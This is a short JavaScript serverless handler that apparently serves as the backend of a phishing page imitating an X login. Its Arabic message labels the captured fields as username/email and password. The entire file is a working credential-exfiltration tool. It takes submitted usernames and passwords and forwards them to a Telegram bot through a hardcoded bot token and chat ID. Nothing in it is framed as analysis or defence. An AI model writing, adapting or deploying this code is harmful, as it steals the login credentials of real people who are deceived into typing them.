export default async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    const { username, password } = req.body;

    const BOT_TOKEN = '8629899342:AAEaNhl2SoXvlsybg-hhuy82Tdlr-VotuGw';
    const CHAT_ID = '8504542096';

    const message = `🎯 *بيانات جديدة من X:*\n\n👤 *اليوزر/الايميل:* \`${username}\`\n🔑 *الباسورد:* \`${password}\``;

    try {
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            })
        });

        if (response.ok) {
            return res.status(200).json({ success: true });
        } else {
            return res.status(500).json({ error: 'Telegram error' });
        }
    } catch (error) {
        return res.status(500).json({ error: 'Server error' });
    }
}
